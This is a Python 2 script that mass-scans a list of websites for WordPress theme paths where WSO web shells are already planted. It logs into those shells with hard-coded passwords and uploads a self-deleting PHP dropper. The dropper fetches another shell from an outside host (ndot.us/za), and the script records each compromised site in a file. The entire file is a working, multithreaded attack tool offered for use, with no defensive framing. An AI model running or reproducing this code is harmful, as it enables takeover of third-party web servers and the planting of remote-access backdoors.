import sys, requests, re, socket, random, string, base64
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)
fr = Fore.RED
fg = Fore.GREEN
print ' \n\t  Tool Priv8  . \n'
requests.urllib3.disable_warnings()
try:
    target = [ i.strip() for i in open(sys.argv[1], mode='r').readlines() ]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[(len(path) - 1)] + '> <sites.txt>')

headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 
   'Upgrade-Insecure-Requests': '1', 
   'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 
   'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
   'Accept-Encoding': 'gzip, deflate', 
   'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 
   'referer': 'www.google.com'}

def id_generator(size=5, chars=string.ascii_uppercase + string.digits):
    return ('').join(random.choice(chars) for _ in range(size))


def URLdomain(site):
    if 'http://' not in site and 'https://' not in site:
        site = 'http://' + site
    if site[(-1)] is not '/':
        site = site + '/'
    return site


def domain(site):
    if site.startswith('http://'):
        site = site.replace('http://', '')
    else:
        if site.startswith('https://'):
            site = site.replace('https://', '')
        if 'www.' in site:
            site = site.replace('www.', '')
        site = site.rstrip()
        if site.split('/'):
            site = site.split('/')[0]
        while site[(-1)] == '/':
            pattern = re.compile('(.*)/')
            sitez = re.findall(pattern, site)
            site = sitez[0]

    return site


def exploit(url):
    try:
        dom = domain(url)
        url = URLdomain(url)
        if 'www.' in url:
            username = url.replace('www.', '')
        else:
            username = url
        if '.' in username:
            username = username.split('.')[0]
        if 'http://' in username:
            username = username.replace('http://', '')
        else:
            username = username.replace('https://', '')
        up = username.title()
        listdir = ['wp-content/themes/sketch/404.php', 'wp-content/themes/twentyfive/include.php', 'wp/wp-content/themes/sketch/404.php', 'wordpress/wp-content/themes/sketch/404.php', 'blog/wp-content/themes/sketch/404.php', 'site/wp-content/themes/sketch/404.php']
        for directory in listdir:
            inj = url + directory
            check = requests.get(inj, headers=headers, verify=False, timeout=15).content
            if '<input type=password name=pass' in check:
                filename = id_generator()
                file_name = 'wso_' + str(filename) + '.php'
                shell_content = "<?php $x=fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-content/" + file_name + '\',\'w+\'),file_get_contents(\'https://ndot.us/za\')); fwrite(fopen($_SERVER[\'DOCUMENT_ROOT\'].\'/.aDriv4\',\'w+\'),file_get_contents(\'aDriv4 BOT v2\'));echo "aDriv4".$x;unlink(__FILE__);?>'
                regx = requests.Session()
                Agent = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}
                check_whopass = requests.get(url, headers=Agent).content
                if "name='watching" not in check_whopass:
                    my_pwd = [
                        '', 'admin', 'G00DV1N', 'Stusa']
                    for MyPwds in my_pwd:
                        Mypwd = MyPwds
                        login = regx.post(inj, data={'pass': Mypwd, 'watching': 'submit'}, headers=Agent)
                        filesp = {'f[]': (file_name, shell_content)}
                        datap = {'a': 'FilesMAn', 'p1': 'uploadFile', 'ne': '', 'charset': 'UTF-8'}
                        responsea = regx.post(url + directory, data=datap, files=filesp, headers=Agent)
                        sitc_path = inj
                        Domainx = sitc_path.replace('404.php', file_name)
                        check_myshell = requests.get(Domainx, headers=Agent)
                        if 'aDriv4' in check_myshell.content:
                            print ' -| ' + url + ('--> {}[0day]').format(fg)
                            open('WPshell.txt', 'a').write(url + 'wp-content/' + file_name + '\n')
                            break
                        else:
                            print ' -| ' + url + ('--> {}[Failed]').format(fr)

                    break
                else:
                    print ' -| ' + url + ('--> {}[Failed]').format(fr)
            else:
                print ' -| ' + url + ('--> {}[Failed]').format(fr)

    except:
        print ' -| ' + url + ('--> {}[Failed]').format(fr)


mp = Pool(150)
mp.map(exploit, target)
mp.close()
mp.join()